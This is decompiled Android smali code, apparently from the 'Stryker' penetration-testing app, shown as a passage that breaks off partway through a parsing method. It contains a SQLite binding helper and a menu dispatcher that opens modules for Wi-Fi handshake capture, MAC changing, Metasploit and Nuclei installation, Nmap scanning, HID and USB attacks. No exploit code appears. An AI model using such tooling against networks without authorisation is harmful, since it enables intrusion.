.class public Landroidx/fragment/app/x0;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroidx/lifecycle/v0;
.implements Ll1/n;
.implements Lq4/a;


# static fields
.field public static b:Ljava/lang/reflect/Field;

.field public static c:Z


# instance fields
.field public final a:I


# direct methods
.method public synthetic constructor <init>()V
    .locals 1

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/16 v0, 0xb

    iput v0, p0, Landroidx/fragment/app/x0;->a:I

    return-void
.end method

.method public synthetic constructor <init>(I)V
    .locals 0

    iput p1, p0, Landroidx/fragment/app/x0;->a:I

    .line 2
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public synthetic constructor <init>(Ljava/lang/Object;)V
    .locals 0

    const/16 p1, 0x15

    iput p1, p0, Landroidx/fragment/app/x0;->a:I

    .line 3
    invoke-direct {p0, p1}, Landroidx/fragment/app/x0;-><init>(I)V

    return-void
.end method

.method public static d(Ly0/t;[Ljava/lang/Object;)V
    .locals 4

    .line 1
    if-nez p1, :cond_0

    .line 2
    .line 3
    return-void

    .line 4
    :cond_0
    array-length v0, p1

    .line 5
    const/4 v1, 0x0

    .line 6
    :goto_0
    if-ge v1, v0, :cond_c

    .line 7
    .line 8
    aget-object v2, p1, v1

    .line 9
    .line 10
    add-int/lit8 v1, v1, 0x1

    .line 11
    .line 12
    if-nez v2, :cond_1

    .line 13
    .line 14
    invoke-virtual {p0, v1}, Ly0/t;->h(I)V

    .line 15
    .line 16
    .line 17
    goto :goto_0

    .line 18
    :cond_1
    instance-of v3, v2, [B

    .line 19
    .line 20
    if-eqz v3, :cond_2

    .line 21
    .line 22
    check-cast v2, [B

    .line 23
    .line 24
    invoke-virtual {p0, v1, v2}, Ly0/t;->p(I[B)V

    .line 25
    .line 26
    .line 27
    goto :goto_0

    .line 28
    :cond_2
    instance-of v3, v2, Ljava/lang/Float;

    .line 29
    .line 30
    if-eqz v3, :cond_3

    .line 31
    .line 32
    check-cast v2, Ljava/lang/Number;

    .line 33
    .line 34
    invoke-virtual {v2}, Ljava/lang/Number;->floatValue()F

    .line 35
    .line 36
    .line 37
    move-result v2

    .line 38
    float-to-double v2, v2

    .line 39
    :goto_1
    invoke-virtual {p0, v2, v3, v1}, Ly0/t;->i(DI)V

    .line 40
    .line 41
    .line 42
    goto :goto_0

    .line 43
    :cond_3
    instance-of v3, v2, Ljava/lang/Double;

    .line 44
    .line 45
    if-eqz v3, :cond_4

    .line 46
    .line 47
    check-cast v2, Ljava/lang/Number;

    .line 48
    .line 49
    invoke-virtual {v2}, Ljava/lang/Number;->doubleValue()D

    .line 50
    .line 51
    .line 52
    move-result-wide v2

    .line 53
    goto :goto_1

    .line 54
    :cond_4
    instance-of v3, v2, Ljava/lang/Long;

    .line 55
    .line 56
    if-eqz v3, :cond_5

    .line 57
    .line 58
    check-cast v2, Ljava/lang/Number;

    .line 59
    .line 60
    invoke-virtual {v2}, Ljava/lang/Number;->longValue()J

    .line 61
    .line 62
    .line 63
    move-result-wide v2

    .line 64
    :goto_2
    invoke-virtual {p0, v1, v2, v3}, Ly0/t;->m(IJ)V

    .line 65
    .line 66
    .line 67
    goto :goto_0

    .line 68
    :cond_5
    instance-of v3, v2, Ljava/lang/Integer;

    .line 69
    .line 70
    if-eqz v3, :cond_6

    .line 71
    .line 72
    check-cast v2, Ljava/lang/Number;

    .line 73
    .line 74
    invoke-virtual {v2}, Ljava/lang/Number;->intValue()I

    .line 75
    .line 76
    .line 77
    move-result v2

    .line 78
    :goto_3
    int-to-long v2, v2

    .line 79
    goto :goto_2

    .line 80
    :cond_6
    instance-of v3, v2, Ljava/lang/Short;

    .line 81
    .line 82
    if-eqz v3, :cond_7

    .line 83
    .line 84
    check-cast v2, Ljava/lang/Number;

    .line 85
    .line 86
    invoke-virtual {v2}, Ljava/lang/Number;->shortValue()S

    .line 87
    .line 88
    .line 89
    move-result v2

    .line 90
    goto :goto_3

    .line 91
    :cond_7
    instance-of v3, v2, Ljava/lang/Byte;

    .line 92
    .line 93
    if-eqz v3, :cond_8

    .line 94
    .line 95
    check-cast v2, Ljava/lang/Number;

    .line 96
    .line 97
    invoke-virtual {v2}, Ljava/lang/Number;->byteValue()B

    .line 98
    .line 99
    .line 100
    move-result v2

    .line 101
    goto :goto_3

    .line 102
    :cond_8
    instance-of v3, v2, Ljava/lang/String;

    .line 103
    .line 104
    if-eqz v3, :cond_9

    .line 105
    .line 106
    check-cast v2, Ljava/lang/String;

    .line 107
    .line 108
    invoke-virtual {p0, v1, v2}, Ly0/t;->d(ILjava/lang/String;)V

    .line 109
    .line 110
    .line 111
    goto :goto_0

    .line 112
    :cond_9
    instance-of v3, v2, Ljava/lang/Boolean;

    .line 113
    .line 114
    if-eqz v3, :cond_b

    .line 115
    .line 116
    check-cast v2, Ljava/lang/Boolean;

    .line 117
    .line 118
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    .line 119
    .line 120
    .line 121
    move-result v2

    .line 122
    if-eqz v2, :cond_a

    .line 123
    .line 124
    const-wide/16 v2, 0x1

    .line 125
    .line 126
    goto :goto_2

    .line 127
    :cond_a
    const-wide/16 v2, 0x0

    .line 128
    .line 129
    goto :goto_2

    .line 130
    :cond_b
    new-instance p0, Ljava/lang/IllegalArgumentException;

    .line 131
    .line 132
    new-instance p1, Ljava/lang/StringBuilder;

    .line 133
    .line 134
    const-string v0, "Cannot bind "

    .line 135
    .line 136
    invoke-direct {p1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 137
    .line 138
    .line 139
    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 140
    .line 141
    .line 142
    const-string v0, " at index "

    .line 143
    .line 144
    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 145
    .line 146
    .line 147
    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    .line 148
    .line 149
    .line 150
    const-string v0, " Supported types: Null, ByteArray, Float, Double, Long, Int, Short, Byte, String"

    .line 151
    .line 152
    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 153
    .line 154
    .line 155
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 156
    .line 157
    .line 158
    move-result-object p1

    .line 159
    invoke-direct {p0, p1}, Ljava/lang/IllegalArgumentException;-><init>(Ljava/lang/String;)V

    .line 160
    .line 161
    .line 162
    throw p0

    .line 163
    :cond_c
    return-void
.end method

.method public static e(I)V
    .locals 2

    .line 1
    const v0, 0x7f01002d

    const v1, 0x7f01002e

    invoke-static {p0, v0, v1}, Landroidx/fragment/app/x0;->f(III)V

    return-void
.end method

.method public static f(III)V
    .locals 6

    .line 1
    sget-boolean v0, Lcom/zalexdev/stryker/MainActivity;->v:Z

    .line 2
    .line 3
    const/4 v1, 0x0

    .line 4
    if-eqz v0, :cond_2

    .line 5
    .line 6
    sget-object v0, Lcom/zalexdev/stryker/MainActivity;->r:Landroid/widget/ImageView;

    .line 7
    .line 8
    if-eqz v0, :cond_2

    .line 9
    .line 10
    sget-object v0, Lcom/zalexdev/stryker/MainActivity;->x:Ljava/util/LinkedHashMap;

    .line 11
    .line 12
    invoke-static {p0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 13
    .line 14
    .line 15
    move-result-object v2

    .line 16
    invoke-virtual {v0, v2}, Ljava/util/LinkedHashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 17
    .line 18
    .line 19
    move-result-object v0

    .line 20
    check-cast v0, Lj2/n;

    .line 21
    .line 22
    if-nez v0, :cond_0

    .line 23
    .line 24
    const-string v0, "This tool"

    .line 25
    .line 26
    goto :goto_0

    .line 27
    :cond_0
    iget-object v0, v0, Lj2/n;->a:Ljava/lang/String;

    .line 28
    .line 29
    :goto_0
    sget-object v2, Lcom/zalexdev/stryker/MainActivity;->y:Ljava/util/HashSet;

    .line 30
    .line 31
    invoke-static {p0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 32
    .line 33
    .line 34
    move-result-object v3

    .line 35
    invoke-virtual {v2, v3}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    .line 36
    .line 37
    .line 38
    move-result v2

    .line 39
    if-eqz v2, :cond_1

    .line 40
    .line 41
    sget-object p0, Lcom/zalexdev/stryker/MainActivity;->r:Landroid/widget/ImageView;

    .line 42
    .line 43
    invoke-virtual {p0}, Landroid/view/View;->getContext()Landroid/content/Context;

    .line 44
    .line 45
    .line 46
    move-result-object p0

    .line 47
    new-instance p1, Ljava/lang/StringBuilder;

    .line 48
    .line 49
    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    .line 50
    .line 51
    .line 52
    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 53
    .line 54
    .line 55
    const-string p2, " needs root hardware \u2014 unavailable on the rootless VM"

    .line 56
    .line 57
    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 58
    .line 59
    .line 60
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 61
    .line 62
    .line 63
    move-result-object p1

    .line 64
    invoke-static {p0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    .line 65
    .line 66
    .line 67
    move-result-object p0

    .line 68
    invoke-virtual {p0}, Landroid/widget/Toast;->show()V

    .line 69
    .line 70
    .line 71
    return-void

    .line 72
    :cond_1
    sget-boolean v2, Lcom/zalexdev/stryker/MainActivity;->w:Z

    .line 73
    .line 74
    if-nez v2, :cond_2

    .line 75
    .line 76
    sget-object v2, Lcom/zalexdev/stryker/MainActivity;->z:Ljava/util/HashSet;

    .line 77
    .line 78
    invoke-static {p0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 79
    .line 80
    .line 81
    move-result-object v3

    .line 82
    invoke-virtual {v2, v3}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    .line 83
    .line 84
    .line 85
    move-result v2

    .line 86
    if-nez v2, :cond_2

    .line 87
    .line 88
    sget-object p0, Lcom/zalexdev/stryker/MainActivity;->r:Landroid/widget/ImageView;

    .line 89
    .line 90
    invoke-virtual {p0}, Landroid/view/View;->getContext()Landroid/content/Context;

    .line 91
    .line 92
    .line 93
    move-result-object p0

    .line 94
    new-instance p1, Ljava/lang/StringBuilder;

    .line 95
    .line 96
    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    .line 97
    .line 98
    .line 99
    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 100
    .line 101
    .line 102
    const-string p2, " needs the VM \u2014 start it from the dashboard first"

    .line 103
    .line 104
    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 105
    .line 106
    .line 107
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 108
    .line 109
    .line 110
    move-result-object p1

    .line 111
    invoke-static {p0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    .line 112
    .line 113
    .line 114
    move-result-object p0

    .line 115
    invoke-virtual {p0}, Landroid/widget/Toast;->show()V

    .line 116
    .line 117
    .line 118
    return-void

    .line 119
    :cond_2
    sget-object v0, Lcom/zalexdev/stryker/MainActivity;->r:Landroid/widget/ImageView;

    .line 120
    .line 121
    if-eqz v0, :cond_3

    .line 122
    .line 123
    invoke-virtual {v0}, Landroid/view/View;->getContext()Landroid/content/Context;

    .line 124
    .line 125
    .line 126
    move-result-object v2

    .line 127
    const v3, 0x7f0801ac

    .line 128
    .line 129
    .line 130
    invoke-virtual {v2, v3}, Landroid/content/Context;->getDrawable(I)Landroid/graphics/drawable/Drawable;

    .line 131
    .line 132
    .line 133
    move-result-object v2

    .line 134
    invoke-virtual {v0, v2}, Landroid/widget/ImageView;->setImageDrawable(Landroid/graphics/drawable/Drawable;)V

    .line 135
    .line 136
    .line 137
    :cond_3
    invoke-static {p0}, Landroidx/fragment/app/x0;->h(I)V

    .line 138
    .line 139
    .line 140
    const v0, 0x7f0a0638

    .line 141
    .line 142
    .line 143
    const/4 v2, 0x1

    .line 144
    if-ne p0, v0, :cond_4

    .line 145
    .line 146
    new-instance p0, Landroid/content/Intent;

    .line 147
    .line 148
    sget-object p1, Lcom/zalexdev/stryker/MainActivity;->r:Landroid/widget/ImageView;

    .line 149
    .line 150
    invoke-virtual {p1}, Landroid/view/View;->getContext()Landroid/content/Context;

    .line 151
    .line 152
    .line 153
    move-result-object p1

    .line 154
    const-class p2, Lcom/stryker/terminal/ui/term/NeoTermActivity;

    .line 155
    .line 156
    invoke-direct {p0, p1, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 157
    .line 158
    .line 159
    const/high16 p1, 0x10000000

    .line 160
    .line 161
    invoke-virtual {p0, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 162
    .line 163
    .line 164
    const-string p1, "com.stryker.terminal.NEW_SESSION"

    .line 165
    .line 166
    invoke-virtual {p0, p1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 167
    .line 168
    .line 169
    sget-object p1, Lcom/zalexdev/stryker/MainActivity;->r:Landroid/widget/ImageView;

    .line 170
    .line 171
    invoke-virtual {p1}, Landroid/view/View;->getContext()Landroid/content/Context;

    .line 172
    .line 173
    .line 174
    move-result-object p1

    .line 175
    invoke-virtual {p1, p0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 176
    .line 177
    .line 178
    return-void

    .line 179
    :cond_4
    const v0, 0x7f0a0716

    .line 180
    .line 181
    .line 182
    const/4 v3, 0x0

    .line 183
    if-ne p0, v0, :cond_5

    .line 184
    .line 185
    new-instance p0, Lcom/zalexdev/stryker/wifi/Wifi;

    .line 186
    .line 187
    invoke-direct {p0}, Lcom/zalexdev/stryker/wifi/Wifi;-><init>()V

    .line 188
    .line 189
    .line 190
    goto/16 :goto_1

    .line 191
    .line 192
    :cond_5
    const v0, 0x7f0a034e

    .line 193
    .line 194
    .line 195
    if-ne p0, v0, :cond_6

    .line 196
    .line 197
    new-instance p0, Lcom/zalexdev/stryker/localnetwork/LocalMain;

    .line 198
    .line 199
    invoke-direct {p0}, Lcom/zalexdev/stryker/localnetwork/LocalMain;-><init>()V

    .line 200
    .line 201
    .line 202
    goto/16 :goto_1

    .line 203
    .line 204
    :cond_6
    const v0, 0x7f0a039a

    .line 205
    .line 206
    .line 207
    if-ne p0, v0, :cond_7

    .line 208
    .line 209
    new-instance p0, Lcom/zalexdev/stryker/macchanger/MACChangerFragment;

    .line 210
    .line 211
    invoke-direct {p0}, Lcom/zalexdev/stryker/macchanger/MACChangerFragment;-><init>()V

    .line 212
    .line 213
    .line 214
    goto/16 :goto_1

    .line 215
    .line 216
    :cond_7
    const v0, 0x7f0a0166

    .line 217
    .line 218
    .line 219
    if-ne p0, v0, :cond_8

    .line 220
    .line 221
    new-instance p0, Lcom/zalexdev/stryker/dashboard/Dashboard;

    .line 222
    .line 223
    invoke-direct {p0}, Lcom/zalexdev/stryker/dashboard/Dashboard;-><init>()V

    .line 224
    .line 225
    .line 226
    goto/16 :goto_1

    .line 227
    .line 228
    :cond_8
    const v0, 0x7f0a008e

    .line 229
    .line 230
    .line 231
    if-ne p0, v0, :cond_9

    .line 232
    .line 233
    new-instance p0, Lcom/zalexdev/stryker/arsenal/ArsenalFragment;

    .line 234
    .line 235
    invoke-direct {p0}, Lcom/zalexdev/stryker/arsenal/ArsenalFragment;-><init>()V

    .line 236
    .line 237
    .line 238
    goto/16 :goto_1

    .line 239
    .line 240
    :cond_9
    const v0, 0x7f0a039e

    .line 241
    .line 242
    .line 243
    if-ne p0, v0, :cond_a

    .line 244
    .line 245
    new-instance p0, Lcom/zalexdev/stryker/coremanger/CoreManager;

    .line 246
    .line 247
    invoke-direct {p0}, Lcom/zalexdev/stryker/coremanger/CoreManager;-><init>()V

    .line 248
    .line 249
    .line 250
    goto/16 :goto_1

    .line 251
    .line 252
    :cond_a
    const v0, 0x7f0a0477

    .line 253
    .line 254
    .line 255
    if-ne p0, v0, :cond_b

    .line 256
    .line 257
    new-instance p0, Lcom/zalexdev/stryker/nuclei/InstallNuclei;

    .line 258
    .line 259
    invoke-direct {p0}, Lcom/zalexdev/stryker/nuclei/InstallNuclei;-><init>()V

    .line 260
    .line 261
    .line 262
    goto/16 :goto_1

    .line 263
    .line 264
    :cond_b
    const v0, 0x7f0a025c

    .line 265
    .line 266
    .line 267
    if-ne p0, v0, :cond_c

    .line 268
    .line 269
    new-instance p0, Lcom/zalexdev/stryker/handshakes/HandshakeStorage;

    .line 270
    .line 271
    invoke-direct {p0}, Lcom/zalexdev/stryker/handshakes/HandshakeStorage;-><init>()V

    .line 272
    .line 273
    .line 274
    goto/16 :goto_1

    .line 275
    .line 276
    :cond_c
    const v0, 0x7f0a03ca

    .line 277
    .line 278
    .line 279
    if-ne p0, v0, :cond_d

    .line 280
    .line 281
    new-instance p0, Lcom/zalexdev/stryker/metasploit/InstallMetasploit;

    .line 282
    .line 283
    invoke-direct {p0}, Lcom/zalexdev/stryker/metasploit/InstallMetasploit;-><init>()V

    .line 284
    .line 285
    .line 286
    goto :goto_1

    .line 287
    :cond_d
    const v0, 0x7f0a0220

    .line 288
    .line 289
    .line 290
    if-ne p0, v0, :cond_e

    .line 291
    .line 292
    new-instance p0, Lcom/zalexdev/stryker/geomac/GeoMac;

    .line 293
    .line 294
    invoke-direct {p0}, Lcom/zalexdev/stryker/geomac/GeoMac;-><init>()V

    .line 295
    .line 296
    .line 297
    goto :goto_1

    .line 298
    :cond_e
    const v0, 0x7f0a0449

    .line 299
    .line 300
    .line 301
    if-ne p0, v0, :cond_f

    .line 302
    .line 303
    new-instance p0, Lcom/zalexdev/stryker/nmap/NmapScanner;

    .line 304
    .line 305
    invoke-direct {p0}, Lcom/zalexdev/stryker/nmap/NmapScanner;-><init>()V

    .line 306
    .line 307
    .line 308
    goto :goto_1

    .line 309
    :cond_f
    const v0, 0x7f0a0747

    .line 310
    .line 311
    .line 312
    if-ne p0, v0, :cond_10

    .line 313
    .line 314
    new-instance p0, Lcom/zalexdev/stryker/wpair/WpairFragment;

    .line 315
    .line 316
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/WpairFragment;-><init>()V

    .line 317
    .line 318
    .line 319
    goto :goto_1

    .line 320
    :cond_10
    const v0, 0x7f0a0019

    .line 321
    .line 322
    .line 323
    if-ne p0, v0, :cond_11

    .line 324
    .line 325
    new-instance p0, Lcom/zalexdev/stryker/about/AboutFragment;

    .line 326
    .line 327
    invoke-direct {p0}, Lcom/zalexdev/stryker/about/AboutFragment;-><init>()V

    .line 328
    .line 329
    .line 330
    goto :goto_1

    .line 331
    :cond_11
    const v0, 0x7f0a0386

    .line 332
    .line 333
    .line 334
    if-ne p0, v0, :cond_12

    .line 335
    .line 336
    new-instance p0, Lcom/zalexdev/stryker/logger/LoggerFragment;

    .line 337
    .line 338
    invoke-direct {p0}, Lcom/zalexdev/stryker/logger/LoggerFragment;-><init>()V

    .line 339
    .line 340
    .line 341
    goto :goto_1

    .line 342
    :cond_12
    const v0, 0x7f0a06fa

    .line 343
    .line 344
    .line 345
    if-ne p0, v0, :cond_13

    .line 346
    .line 347
    new-instance p0, Lcom/zalexdev/stryker/vnc/VNCFragment;

    .line 348
    .line 349
    invoke-direct {p0}, Lcom/zalexdev/stryker/vnc/VNCFragment;-><init>()V

    .line 350
    .line 351
    .line 352
    goto :goto_1

    .line 353
    :cond_13
    const v0, 0x7f0a024a

    .line 354
    .line 355
    .line 356
    if-ne p0, v0, :cond_14

    .line 357
    .line 358
    new-instance p0, Lcom/zalexdev/stryker/hid/ui/HidFragment;

    .line 359
    .line 360
    invoke-direct {p0}, Lcom/zalexdev/stryker/hid/ui/HidFragment;-><init>()V

    .line 361
    .line 362
    .line 363
    goto :goto_1

    .line 364
    :cond_14
    const v0, 0x7f0a067c

    .line 365
    .line 366
    .line 367
    if-ne p0, v0, :cond_15

    .line 368
    .line 369
    new-instance p0, Lcom/zalexdev/stryker/usbarsenal/ui/UsbArsenalFragment;

    .line 370
    .line 371
    invoke-direct {p0}, Lcom/zalexdev/stryker/usbarsenal/ui/UsbArsenalFragment;-><init>()V

    .line 372
    .line 373
    .line 374
    goto :goto_1

    .line 375
    :cond_15
    move-object p0, v3

    .line 376
    :goto_1
    if-eqz p0, :cond_17

    .line 377
    .line 378
    sget-object v0, Lcom/zalexdev/stryker/MainActivity;->t:Landroidx/fragment/app/u0;

    .line 379
    .line 380
    invoke-virtual {v0}, Landroidx/fragment/app/u0;->x()I

    .line 381
    .line 382
    .line 383
    move-result v0

    .line 384
    if-lez v0, :cond_16

    .line 385
    .line 386
    sget-object v0, Lcom/zalexdev/stryker/MainActivity;->t:Landroidx/fragment/app/u0;

    .line 387
    .line 388
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 389
    .line 390
    .line 391
    new-instance v4, Landroidx/fragment/app/s0;

    .line 392
    .line 393
    const/4 v5, -0x1

    .line 394
    invoke-direct {v4, v0, v5, v2}, Landroidx/fragment/app/s0;-><init>(Landroidx/fragment/app/u0;II)V

    .line 395
    .line 396
    .line 397
    invoke-virtual {v0, v4, v1}, Landroidx/fragment/app/u0;->q(Landroidx/fragment/app/r0;Z)V

    .line 398
    .line 399
    .line 400
    :cond_16
    sget-object v0, Lcom/zalexdev/stryker/MainActivity;->t:Landroidx/fragment/app/u0;

    .line 401
    .line 402
    invoke-static {v0, v0}, Landroid/support/v4/media/session/a;->h(Landroidx/fragment/app/u0;Landroidx/fragment/app/u0;)Landroidx/fragment/app/a;

    .line 403
    .line 404
    .line 405
    move-result-object v0

    .line 406
    invoke-virtual {v0, p1, p2, v1, v1}, Landroidx/fragment/app/e1;->f(IIII)V

    .line 407
    .line 408
    .line 409
    const p1, 0x7f0a0205

    .line 410
    .line 411
    .line 412
    invoke-virtual {v0, p0, v3, p1}, Landroidx/fragment/app/e1;->e(Landroidx/fragment/app/Fragment;Ljava/lang/String;I)V

    .line 413
    .line 414
    .line 415
    invoke-virtual {v0, v1}, Landroidx/fragment/app/a;->h(Z)I

    .line 416
    .line 417
    .line 418
    :cond_17
    return-void
.end method

.method public static g(Landroidx/fragment/app/Fragment;Ljava/lang/String;I)V
    .locals 2

    .line 1
    invoke-static {p2}, Landroidx/fragment/app/x0;->h(I)V

    .line 2
    .line 3
    .line 4
    sget-object p2, Lcom/zalexdev/stryker/MainActivity;->t:Landroidx/fragment/app/u0;

    .line 5
    .line 6
    invoke-static {p2, p2}, Landroid/support/v4/media/session/a;->h(Landroidx/fragment/app/u0;Landroidx/fragment/app/u0;)Landroidx/fragment/app/a;

    .line 7
    .line 8
    .line 9
    move-result-object p2

    .line 10
    const v0, 0x7f01002d

    .line 11
    .line 12
    .line 13
    const v1, 0x7f01002e

    .line 14
    .line 15
    .line 16
    invoke-virtual {p2, v0, v1, v0, v1}, Landroidx/fragment/app/e1;->f(IIII)V

    .line 17
    .line 18
    .line 19
    const/4 v0, 0x0

    .line 20
    const v1, 0x7f0a0205

    .line 21
    .line 22
    .line 23
    invoke-virtual {p2, p0, v0, v1}, Landroidx/fragment/app/e1;->e(Landroidx/fragment/app/Fragment;Ljava/lang/String;I)V

    .line 24
    .line 25
    .line 26
    if-eqz p1, :cond_0

    .line 27
    .line 28
    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    .line 29
    .line 30
    .line 31
    move-result p0

    .line 32
    if-nez p0, :cond_0

    .line 33
    .line 34
    invoke-virtual {p2, p1}, Landroidx/fragment/app/e1;->c(Ljava/lang/String;)V

    .line 35
    .line 36
    .line 37
    :cond_0
    const/4 p0, 0x0

    .line 38
    invoke-virtual {p2, p0}, Landroidx/fragment/app/a;->h(Z)I

    .line 39
    .line 40
    .line 41
    return-void
.end method

.method public static h(I)V
    .locals 4

    .line 1
    sget-object v0, Lcom/zalexdev/stryker/MainActivity;->u:Ljava/util/HashMap;

    .line 2
    .line 3
    sget v1, Lcom/zalexdev/stryker/MainActivity;->s:I

    .line 4
    .line 5
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 6
    .line 7
    .line 8
    move-result-object v1

    .line 9
    invoke-virtual {v0, v1}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 10
    .line 11
    .line 12
    move-result-object v1

    .line 13
    check-cast v1, Landroid/view/View;

    .line 14
    .line 15
    if-eqz v1, :cond_0

    .line 16
    .line 17
    sget v2, Lcom/zalexdev/stryker/MainActivity;->s:I

    .line 18
    .line 19
    const/4 v3, 0x0

    .line 20
    invoke-static {v1, v2, v3}, Landroidx/fragment/app/x0;->q(Landroid/view/View;IZ)V

    .line 21
    .line 22
    .line 23
    :cond_0
    invoke-static {p0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 24
    .line 25
    .line 26
    move-result-object v1

    .line 27
    invoke-virtual {v0, v1}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 28
    .line 29
    .line 30
    move-result-object v0

    .line 31
    check-cast v0, Landroid/view/View;

    .line 32
    .line 33
    if-eqz v0, :cond_1

    .line 34
    .line 35
    const/4 v1, 0x1

    .line 36
    invoke-static {v0, p0, v1}, Landroidx/fragment/app/x0;->q(Landroid/view/View;IZ)V

    .line 37
    .line 38
    .line 39
    :cond_1
    sput p0, Lcom/zalexdev/stryker/MainActivity;->s:I

    .line 40
    .line 41
    return-void
.end method

.method public static i(Lf/q0;Landroid/database/sqlite/SQLiteDatabase;)Ld1/c;
    .locals 2

    .line 1
    const-string v0, "refHolder"

    .line 2
    .line 3
    invoke-static {p0, v0}, Li5/a;->p(Ljava/lang/Object;Ljava/lang/String;)V

    .line 4
    .line 5
    .line 6
    const-string v0, "sqLiteDatabase"

    .line 7
    .line 8
    invoke-static {p1, v0}, Li5/a;->p(Ljava/lang/Object;Ljava/lang/String;)V

    .line 9
    .line 10
    .line 11
    iget-object v0, p0, Lf/q0;->b:Ljava/lang/Object;

    .line 12
    .line 13
    check-cast v0, Ld1/c;

    .line 14
    .line 15
    if-eqz v0, :cond_0

    .line 16
    .line 17
    iget-object v1, v0, Ld1/c;->a:Landroid/database/sqlite/SQLiteDatabase;

    .line 18
    .line 19
    invoke-static {v1, p1}, Li5/a;->d(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 20
    .line 21
    .line 22
    move-result v1

    .line 23
    if-nez v1, :cond_1

    .line 24
    .line 25
    :cond_0
    new-instance v0, Ld1/c;

    .line 26
    .line 27
    invoke-direct {v0, p1}, Ld1/c;-><init>(Landroid/database/sqlite/SQLiteDatabase;)V

    .line 28
    .line 29
    .line 30
    iput-object v0, p0, Lf/q0;->b:Ljava/lang/Object;

    .line 31
    .line 32
    :cond_1
    return-object v0
.end method

.method public static j(Ljava/lang/String;)Z
    .locals 3

    .line 1
    const/4 v0, 0x0

    if-eqz p0, :cond_3

    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_0

    goto :goto_1

    :cond_0
    move v1, v0

    :goto_0
    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v2

    if-ge v1, v2, :cond_2

    invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v2

    invoke-static {v2}, Ljava/lang/Character;->isDigit(C)Z

    move-result v2

    if-nez v2, :cond_1

    return v0

    :cond_1
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_2
    const/4 p0, 0x1

    return p0

    :cond_3
    :goto_1
    return v0
.end method

.method public static k(Ljava/lang/String;)Lg3/e;
    .locals 34

    const-string v0, "\\R"

    const/4 v1, -0x1

    move-object/from16 v2, p0

    invoke-virtual {v2, v0, v1}, Ljava/lang/String;->split(Ljava/lang/String;I)[Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/util/ArrayList;

    array-length v3, v0

    invoke-direct {v2, v3}, Ljava/util/ArrayList;-><init>(I)V

    new-instance v3, Ljava/util/HashMap;

    invoke-direct {v3}, Ljava/util/HashMap;-><init>()V

    const/4 v6, 0x0

    const/4 v7, 0x0

    move v8, v7

    const-wide/16 v9, 0x0

    const-wide/16 v14, 0x0

    :goto_0
    array-length v11, v0

    if-ge v8, v11, :cond_3d

    add-int/lit8 v13, v8, 0x1

    aget-object v8, v0, v8

    invoke-virtual {v8}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/String;->isEmpty()Z

    move-result v11

    if-eqz v11, :cond_1

    move-object/from16 v23, v0

    move-object/from16 v22, v3

    move v4, v7

    move v8, v13

    move-wide/from16 v24, v14

    :cond_0
    :goto_1
    const-wide/16 v11, 0x0

    goto/16 :goto_14

    .line 1
    :cond_1
    invoke-virtual {v3}, Ljava/util/HashMap;->isEmpty()Z

    move-result v11

    if-eqz v11, :cond_2

    goto :goto_3

    :cond_2
